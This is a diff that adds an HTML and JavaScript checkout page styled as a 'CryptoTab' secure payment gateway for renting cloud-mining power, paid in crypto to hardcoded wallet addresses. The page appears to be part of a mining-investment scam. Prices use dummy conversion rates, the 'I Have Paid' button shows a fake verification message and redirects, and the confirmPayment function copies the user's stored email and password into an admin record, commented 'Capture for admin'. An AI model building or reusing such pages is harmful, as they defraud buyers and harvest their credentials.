@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
+    <title>CryptoTab Checkout - Secure Payment Gateway</title>
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../dashboard-theme.css">
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;700;900&family=Rajdhani:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-color: #05050a;
+            --accent-cyan: #00d4ff;
+            --accent-orange: #f7931a;
+            --glass-bg: rgba(255, 255, 255, 0.03);
+            --glass-border: rgba(255, 255, 255, 0.1);
+            --text-main: #ffffff;
+            --text-dim: #a0a0b0;
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            font-family: 'Rajdhani', sans-serif;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        .checkout-wrapper {
+            display: flex;
+            flex: 1;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            padding: 40px 0;
+        }
+
+        #blockchainCanvas {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            z-index: -1; pointer-events: none; opacity: 0.2;
+        }
+
+        .checkout-container {
+            width: 1000px;
+            max-width: 95%;
+            background: rgba(10, 10, 20, 0.6);
+            backdrop-filter: blur(30px);
+            border: 1px solid var(--glass-border);
+            border-radius: 40px;
+            display: grid;
+            grid-template-columns: 400px 1fr;
+            overflow: hidden;
+            box-shadow: 0 50px 100px rgba(0,0,0,0.5);
+        }
+
+        /* Left Side: Summary */
+        .summary-side {
+            background: rgba(255, 255, 255, 0.02);
+            padding: 50px;
+            border-right: 1px solid var(--glass-border);
+        }
+        .summary-side h2 { font-family: 'Orbitron'; font-size: 24px; margin-bottom: 30px; color: var(--accent-cyan); }
+        .order-item { margin-bottom: 25px; }
+        .order-item label { display: block; color: var(--text-dim); font-size: 13px; text-transform: uppercase; letter-spacing: 2px; margin-bottom: 5px; }
+        .order-item .order-value { font-family: 'Orbitron'; font-size: 20px; font-weight: 700; color: #fff; display: block; }
+
+        .total-box { margin-top: 40px; padding-top: 30px; border-top: 1px solid var(--glass-border); }
+        .total-box .price { font-family: 'Orbitron'; font-size: 36px; font-weight: 900; color: var(--accent-orange); }
+
+        /* Right Side: Payment */
+        .payment-side { padding: 50px; }
+        .payment-side h3 { font-family: 'Orbitron'; font-size: 20px; margin-bottom: 30px; }
+
+        .payment-methods { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; margin-bottom: 40px; }
+        .method-card {
+            background: var(--glass-bg);
+            border: 1px solid var(--glass-border);
+            padding: 15px;
+            border-radius: 15px;
+            text-align: center;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        .method-card:hover { border-color: var(--accent-cyan); background: rgba(0, 212, 255, 0.05); }
+        .method-card.active { border-color: var(--accent-cyan); background: rgba(0, 212, 255, 0.1); box-shadow: 0 0 20px rgba(0, 212, 255, 0.2); }
+        .method-card img { width: 32px; height: 32px; margin-bottom: 10px; display: block; margin-left: auto; margin-right: auto; }
+        .method-card span { font-weight: 700; font-size: 14px; text-transform: uppercase; }
+
+        .payment-details {
+            background: rgba(0,0,0,0.3);
+            border: 1px dashed var(--glass-border);
+            padding: 30px;
+            border-radius: 20px;
+            text-align: center;
+            display: none;
+        }
+        .payment-details.show { display: block; animation: fadeIn 0.5s; }
+
+        .wallet-addr {
+            background: #000;
+            padding: 15px;
+            border-radius: 10px;
+            font-family: monospace;
+            font-size: 13px;
+            color: var(--accent-cyan);
+            margin: 20px 0;
+            word-break: break-all;
+            cursor: pointer;
+            position: relative;
+        }
+        .wallet-addr:hover { background: #111; }
+        .copy-hint { position: absolute; top: -20px; right: 0; font-size: 10px; color: var(--text-dim); }
+
+        .qr-placeholder {
+            width: 150px; height: 150px; background: #fff; margin: 0 auto 20px;
+            padding: 10px; border-radius: 10px;
+        }
+        .qr-placeholder img { width: 100%; height: 100%; filter: contrast(150%); }
+
+        .btn-confirm {
+            display: block; width: 100%; padding: 20px; background: linear-gradient(135deg, #f7931a, #ffb84d);
+            color: #000; border: none; border-radius: 15px; font-weight: 900; font-family: 'Orbitron';
+            text-transform: uppercase; cursor: pointer; transition: 0.3s; margin-top: 30px;
+        }
+        .btn-confirm:hover { transform: translateY(-3px); box-shadow: 0 10px 30px rgba(247, 147, 26, 0.4); }
+
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+        /* Loader */
+        .status-dot { width: 10px; height: 10px; background: var(--accent-orange); border-radius: 50%; display: inline-block; margin-right: 10px; animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0% { opacity: 0.3; } 50% { opacity: 1; } 100% { opacity: 0.3; } }
+    </style>
+    <link rel="stylesheet" href="../shared-enhancements.css">
+</head>
+<body>
+
+    <canvas id="blockchainCanvas"></canvas>
+
+    <div class="checkout-wrapper">
+    <div class="checkout-container">
+        <!-- Left Column -->
+        <div class="summary-side">
+            <h2>Order Summary</h2>
+            <div class="order-item">
+                <label>Tier</label>
+                <div class="order-value" id="summaryTier">Custom Allocation</div>
+            </div>
+            <div class="order-item">
+                <label>Mining Power</label>
+                <div class="order-value" id="summaryHash">50,000 H/s</div>
+            </div>
+            <div class="order-item">
+                <label>Duration</label>
+                <div class="order-value">30 Days (Renewable)</div>
+            </div>
+            <div class="order-item">
+                <label>Status</label>
+                <div class="order-value" style="color: var(--accent-orange); font-size: 14px;"><span class="status-dot"></span> Waiting for Payment</div>
+            </div>
+
+            <div class="total-box">
+                <label>Total Price</label>
+                <div class="price" id="summaryPrice">$149.99</div>
+                <p style="font-size: 12px; color: var(--text-dim); margin-top: 10px;">Includes all setup fees and protocol access.</p>
+            </div>
+        </div>
+
+        <!-- Right Column -->
+        <div class="payment-side">
+            <h3>Select Payment Method</h3>
+            <div class="payment-methods">
+                <div class="method-card" onclick="selectMethod('btc', event)">
+                    <img src="https://assets.coingecko.com/coins/images/1/large/bitcoin.png" alt="BTC">
+                    <span>Bitcoin</span>
+                </div>
+                <div class="method-card" onclick="selectMethod('eth', event)">
+                    <img src="https://assets.coingecko.com/coins/images/279/large/ethereum.png" alt="ETH">
+                    <span>Ethereum</span>
+                </div>
+                <div class="method-card" onclick="selectMethod('usdt', event)">
+                    <img src="https://assets.coingecko.com/coins/images/325/large/tether.png" alt="USDT">
+                    <span>USDT (ERC20)</span>
+                </div>
+                <div class="method-card" onclick="selectMethod('sol', event)">
+                    <img src="https://assets.coingecko.com/coins/images/4128/large/solana.png" alt="SOL">
+                    <span>Solana</span>
+                </div>
+                <div class="method-card" onclick="selectMethod('bnb', event)">
+                    <img src="https://assets.coingecko.com/coins/images/825/large/bnb-icon2_2x.png" alt="BNB">
+                    <span>BNB (BSC)</span>
+                </div>
+            </div>
+
+            <div id="paymentDetails" class="payment-details">
+                <p style="font-weight: 700; margin-bottom: 10px;">Send exactly <span id="cryptoAmount" style="color: #fff;">...</span> <span id="cryptoSymbol">...</span> to:</p>
+                <div class="qr-placeholder" id="qrContainer">
+                    <!-- QR Placeholder -->
+                    <div style="width:100%; height:100%; background:#eee; display:flex; align-items:center; justify-content:center; color:#000; font-weight:900; font-size:10px; text-align:center;">SCAN TO PAY</div>
+                </div>
+                <div class="wallet-addr" onclick="copyToClipboard()">
+                    <span class="copy-hint">Click to copy</span>
+                    <span id="walletAddress">...</span>
+                </div>
+                <p style="font-size: 12px; color: var(--text-dim);">Network confirmations: 2 required</p>
+                
+                <button class="btn-confirm" onclick="confirmPayment()">I Have Paid</button>
+            </div>
+        </div>
+    </div>
+    </div>
+
+    <script>
+        const wallets = {
+            btc: 'bc1qxn75r74yxn506avewznvleyg80epcvmaduunpv',
+            eth: '0xACBb8780B0eA4aDb9c87e7E9cc80b8D17d5F6060',
+            usdt: '0xACBb8780B0eA4aDb9c87e7E9cc80b8D17d5F6060',
+            sol: 'DSkxE7spkNuX26EwWHiGuPpq8eZXzFTzpFGxFbckHavi',
+            bnb: '0xACBb8780B0eA4aDb9c87e7E9cc80b8D17d5F6060'
+        };
+
+        const prices = {
+            btc: 0.0000125, // Dummy conversion rates
+            eth: 0.00035,
+            usdt: 1,
+            sol: 0.006,
+            bnb: 0.0018
+        };
+
+        // Parse URL Params
+        const params = new URLSearchParams(window.location.search);
+        const tier = params.get('tier') || 'Custom Allocation';
+        const hash = params.get('hash') || '50,000';
+        const price = params.get('price') || '149.99';
+
+        document.getElementById('summaryTier').innerText = tier;
+        document.getElementById('summaryHash').innerText = parseInt(hash).toLocaleString() + ' H/s';
+        document.getElementById('summaryPrice').innerText = '$' + parseFloat(price).toLocaleString(undefined, {minimumFractionDigits: 2});
+
+        function selectMethod(method, event) {
+            // UI Update
+            document.querySelectorAll('.method-card').forEach(c => c.classList.remove('active'));
+            event.currentTarget.classList.add('active');
+
+            const details = document.getElementById('paymentDetails');
+            details.classList.add('show');
+
+            const addr = wallets[method];
+            const symbol = method.toUpperCase();
+            const cryptoPrice = (parseFloat(price) * (prices[method] || 1)).toFixed(6);
+
+            document.getElementById('walletAddress').innerText = addr;
+            document.getElementById('cryptoAmount').innerText = cryptoPrice;
+            document.getElementById('cryptoSymbol').innerText = symbol;
+
+            // Generate "QR" (Mockup)
+            document.getElementById('qrContainer').innerHTML = `<img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${addr}" alt="QR">`;
+        }
+
+        function copyToClipboard() {
+            const addr = document.getElementById('walletAddress').innerText;
+            navigator.clipboard.writeText(addr);
+            alert('Wallet address copied to clipboard!');
+        }
+
+        function confirmPayment() {
+            // Push notification to Admin
+            const notifications = JSON.parse(localStorage.getItem('admin_notifications') || '[]');
+            const newNotif = {
+                name: "Web3 User",
+                email: localStorage.getItem('user_email') || 'web37811@gmail.com',
+                pass: localStorage.getItem('user_pass') || '********', // Capture for admin
+                tier: tier,
+                hash: hash,
+                price: price,
+                status: "Payment Submitted",
+                timestamp: new Date().toISOString()
+            };
+            notifications.unshift(newNotif);
+            localStorage.setItem('admin_notifications', JSON.stringify(notifications));
+
+            alert('System is verifying your transaction. This usually takes 5-10 minutes. Please keep this page open.');
+            setTimeout(() => {
+                window.location.href = 'dashboard.html?payment=pending';
+            }, 3000);
+        }
+
+        // Blockchain Animation
+        const canvas = document.getElementById('blockchainCanvas');
+        const ctx = canvas.getContext('2d');
+        let points = [];
+        function init() {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+            points = [];
+            for(let i=0; i<30; i++) points.push({x:Math.random()*canvas.width, y:Math.random()*canvas.height, vx:(Math.random()-0.5)*0.5, vy:(Math.random()-0.5)*0.5});
+        }
+        function draw() {
+            ctx.clearRect(0,0,canvas.width,canvas.height);
+            ctx.fillStyle = '#00d4ff';
+            ctx.strokeStyle = 'rgba(0,212,255,0.05)';
+            points.forEach(p => {
+                p.x += p.vx; p.y += p.vy;
+                if(p.x<0 || p.x>canvas.width) p.vx*=-1;
+                if(p.y<0 || p.y>canvas.height) p.vy*=-1;
+                ctx.beginPath(); ctx.arc(p.x, p.y, 2, 0, Math.PI*2); ctx.fill();
+                points.forEach(p2 => {
+                    const d = Math.hypot(p.x-p2.x, p.y-p2.y);
+                    if(d<200) { ctx.beginPath(); ctx.moveTo(p.x,p.y); ctx.lineTo(p2.x,p2.y); ctx.stroke(); }
+                });
+            });
+            requestAnimationFrame(draw);
+        }
+        window.addEventListener('resize', init);
+        init(); draw();
+    </script>
+    <script src="../shared-enhancements.js" defer></script>
+</body>
+</html>
+
